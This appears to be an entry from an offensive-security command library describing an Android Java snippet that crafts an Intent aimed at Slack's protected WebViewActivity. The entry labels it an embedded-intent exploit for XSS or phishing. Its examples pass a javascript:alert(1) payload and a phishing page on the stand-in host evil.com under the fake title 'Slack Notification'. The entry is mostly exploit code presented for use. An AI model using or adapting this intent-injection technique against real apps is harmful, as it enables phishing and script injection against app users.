---
id: cmd-create-webview-intent
data: >-
  Intent next = new Intent();
  next.setClassName("com.Slack","com.Slack.ui.WebViewActivity");
  next.putExtra("extra_url","http://example.com/");
  next.putExtra("extra_title","test");
tags:
  - intent-creation
  - webview
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:44.594Z'
verified: false
validated: true
submitted: true
---
# create-webview-intent

## Command

```java
Intent next = new Intent(); next.setClassName("com.Slack","com.Slack.ui.WebViewActivity"); next.putExtra("extra_url","http://example.com/"); next.putExtra("extra_title","test");
```

## Description

Creates an inner Intent targeting Slack's protected WebViewActivity with extras for arbitrary URL and title, used for XSS or phishing in embedded intent exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| setClassName("com.Slack","com.Slack.ui.WebViewActivity") | Specifies target component | Yes |
| putExtra("extra_url","http://example.com/") | Sets URL to load (arbitrary) | Yes |
| putExtra("extra_title","test") | Sets fake title | Yes |

## Examples

### Basic Usage

```java
Intent next = new Intent(); next.setClassName("com.Slack","com.Slack.ui.WebViewActivity"); next.putExtra("extra_url","javascript:alert(1)");
```

### Advanced Usage

```java
Intent next = new Intent(); next.setClassName("com.Slack","com.Slack.ui.WebViewActivity"); next.putExtra("extra_url","http://evil.com/phish"); next.putExtra("extra_title","Slack Notification");
```

## Expected Output

Intent object configured to open WebView with malicious URL and title, bypassing normal checks when embedded.

## Related

- [[commands/embed-intent-in-homeactivity]]
- [[procedures/Craft-Embedded-Intent-for-WebViewActivity]]
